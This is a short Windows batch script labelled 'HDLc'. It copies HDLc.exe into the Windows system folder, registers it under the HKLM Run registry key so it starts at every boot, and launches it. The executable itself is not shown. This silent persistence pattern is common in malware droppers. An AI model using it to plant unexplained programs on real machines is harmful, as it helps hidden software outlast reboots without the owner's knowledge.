@echo off
cls
title HDLc
echo Installing...
copy %~dp0HDLc.exe /B %windir% /Y
reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v HDLc /d %windir%\HDLc.exe /f
start %windir%\HDLc.exe
start %~dp0%HDLc.exe
pause